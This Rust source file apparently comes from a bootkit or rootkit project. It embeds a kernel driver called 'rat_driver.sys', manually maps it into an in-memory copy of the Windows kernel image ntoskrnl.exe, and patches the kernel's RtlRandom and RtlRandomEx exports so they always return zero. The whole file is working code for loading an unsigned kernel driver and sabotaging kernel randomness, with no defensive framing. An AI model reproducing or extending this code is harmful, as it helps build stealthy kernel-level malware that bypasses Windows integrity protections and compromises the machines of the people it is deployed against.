use log::{error, info};

use crate::patcher::return_zero_patch;
use crate::utils::{mapper, pe};

#[cfg(debug_assertions)]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/debug/rat_driver_package/rat_driver.sys");

#[cfg(not(debug_assertions))]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/release/rat_driver_package/rat_driver.sys");

pub fn patch_ntoskrnl(ntoskrnl: &mut [u8], empty_buffer: &mut [u8]) {
    info!("Patching ntoskrnl.exe...");

    let offset = unsafe { mapper::manual_map(DRIVER, ntoskrnl, empty_buffer) };
    if let Some(offset) = offset {
        info!(
            "Mapped kernel driver to allocated buffer, bytes on disk = {}, bytes in memory = {offset}",
            DRIVER.len(),
        );
    } else {
        error!("Cannot map kernel driver to allocated buffer");
        return;
    }

    unsafe {
        pe::iterate_export_address_table_mut(ntoskrnl, |name, function| {
            if name == c"RtlRandom" || name == c"RtlRandomEx" {
                let patched = return_zero_patch();
                function[..patched.len()].copy_from_slice(patched);
                info!(
                    "Patched function {name:?} at address {:p}",
                    function.as_ptr()
                );
            }
        });
    }
}
